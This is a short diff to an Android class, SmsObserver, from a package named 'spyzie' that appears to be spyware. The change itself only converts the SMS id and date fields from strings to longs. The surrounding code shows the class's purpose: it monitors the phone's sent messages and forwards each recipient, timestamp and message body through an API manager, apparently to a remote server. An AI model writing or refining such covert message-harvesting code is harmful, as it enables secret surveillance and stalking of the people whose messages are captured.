@@ -11,7 +11,7 @@ import com.tantd.spyzie.data.network.AppApiManager;
 
 public class SmsObserver extends ContentObserver {
 
-    private String lastSmsId;
+    private long lastSmsId;
     private Context mContext;
 
     public SmsObserver(Handler handler, Context context) {
@@ -25,10 +25,10 @@ public class SmsObserver extends ContentObserver {
         Uri smsUri = Uri.parse("content://sms/sent");
         Cursor cursor = mContext.getContentResolver().query(smsUri, null, null, null, null);
         if (cursor.moveToNext()) {
-            String id = cursor.getString(cursor.getColumnIndex("_id"));
-            if (!id.equals(lastSmsId)) {
+            long id = cursor.getLong(cursor.getColumnIndex("_id"));
+            if (id != lastSmsId) {
                 String address = cursor.getString(cursor.getColumnIndex("address"));
-                String time = cursor.getString(cursor.getColumnIndex("date"));
+                long time = cursor.getLong(cursor.getColumnIndex("date"));
                 String body = cursor.getString(cursor.getColumnIndex("body"));
                 lastSmsId = id;
                 AppApiManager.getInstance().sendSmsData(new Sms(id, address, time, body, false));
